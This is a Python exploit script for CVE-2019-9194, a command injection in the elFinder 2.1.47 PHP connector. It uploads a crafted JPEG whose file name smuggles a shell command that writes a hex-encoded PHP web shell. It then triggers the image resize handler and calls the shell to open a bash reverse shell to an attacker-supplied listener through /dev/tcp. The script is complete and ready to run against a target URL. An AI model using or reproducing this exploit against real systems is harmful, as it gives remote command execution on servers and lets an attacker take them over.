import requests
import json
import argparse
import base64

class elFinder():
    def __init__(self,target,lhost,lport):
        self.target = target
        self.lhost = lhost
        self.lport = lport
        self.url = self.check_url()
        self.content = self.decode_blob()
        self.hash = self.upload()
        self.rotate()
        self.shell()

    def check_url(self):
        check = self.target[-1]
        if check == "/":
            return self.target
        else:
            fixed_url = self.target + "/"
            return fixed_url

    def decode_blob(self):
        content = "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEAAkGBxIQEg8PEhIPFRIPDw8QEA8QDw8PEBAPFRE" \
                "WFhUVFRUYHSggGBolHRUVITEhJSkrLi4uFx8zODMsNygtLisBCgoKDg0NFQ8PFSsdFR0tLS0tKys" \
                "rKy0tKy0tNy03LS0rKy0tLSsrKzc3LS0rLSsrKy0rKzctLTcrLSstNy0tK//AABEIAQMAwgMBIgAC" \
                "EQEDEQH/xAAbAAABBQEBAAAAAAAAAAAAAAADAAECBAUGB//EAD8QAAIBAgMFBQUGBQIHAQAAAAECAAM" \
                "RBCExBRJBUWEGMnGBkRMiUqHRFGJyscHwQpKisuEjkxUXM3OC0vEH/8QAGQEBAQEBAQEAAAAAAAAAA" \
                "AAAAAECAwUE/8QAIBEBAQEAAwADAAMBAAAAAAAAABEBAgMSITFBEyJRBP/aAAwDAQACEQMRAD8Aynwi9IL7OvMS" \
                "VRjzlVmPOenHy0VlURiyyFOnvQVZbRCo1yLWygvY6AamBqtnFTrG/wBZrylEr0rG1jfj4wJuIcNBuIiIpCMY" \
                "MCTtLBAx1iIkgYBUQDNj5DWWFxxA3V90dNT4mVAt5MLwiFTepeIRboEleESUSwlpXTOEBgWywGkmmkqp" \
                "DqYQYGFVjAAyYMotI8IHlRHhleQWN6KDiiDJOHaROEaWTfnI36xGqDSw7AxqmFMs70FUPWSFZ1XByK4E9JaaNeaQFsL" \
                "bOBenLhcQTOIFYUo5WHLwZIgD3YgIQgSFpUqQMYtGiiB1kxICTUQJqIRFjbto6mQFEmpggZJGgWVMKryqrQo8P3Bo" \
                "cCBlY2hvIHN5c3RlbSgkX1JFUVVFU1RbJ2MnXSk7ID8+Cg=="
        decoded_bytes = base64.b64decode(content)
        return decoded_bytes

    def upload(self):
        requests.packages.urllib3.disable_warnings()
        print("Uploading image")
        upload_url = self.url + "php/connector.minimal.php"
        payload = "rse.jpg;echo 3c3f7068702073797374656d28245f524551554553545b2263225d293b203f3e0a |xxd -r -p > rse.php; #.jpg"
        file_data = {
                "cmd":"upload",
                "target":"l1_Lw"
                }
        file_upload = {
                "upload[]":(payload,self.content,"image/jpeg",{"Content-Disposition":"form-data"})
                }
        upload_req = requests.post(upload_url,data=file_data,files=file_upload,verify=False)
        load_hash = json.loads(upload_req.text)
        file_hash = load_hash['added'][0]['hash']
        print("Gettin file hash: " + file_hash)
        return file_hash

    def rotate(self):
        requests.packages.urllib3.disable_warnings()
        print("Rotating image")
        rotate_url = self.url + "php/connector.minimal.php?target=" + self.hash + "&degree=180&mode=rotate&cmd=resize"
        requests.get(rotate_url)

    def shell(self):
        requests.packages.urllib3.disable_warnings()
        shell_url = self.url + "php/rse.php?c=bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/" + self.lhost + "/" + self.lport + "%200>%261'"
        print("Requesting shell at " + shell_url)
        requests.post(shell_url)

if __name__=="__main__":
    parser = argparse.ArgumentParser(description='CVE-2019-9194 elFinder 2.1.47 - PHP connector Command Injection')
    parser.add_argument('-t', metavar='<Target base URL>', help='Example: -t http://elfinder.url/elfinder/', required=True)
    parser.add_argument('-lh', metavar='<Listener IP>',help="Example: -lh 127.0.0.1", required=True)
    parser.add_argument('-lp', metavar='<Listener Port>',help="Example: -lp 1337", required=True)
    args = parser.parse_args()

    try:
        print('CVE-2019-9194 elFinder 2.1.47 - PHP connector Command Injection')
        elFinder(args.t,args.lh,args.lp)
    except KeyboardInterrupt:
        print("\nBye Bye!")
        exit()
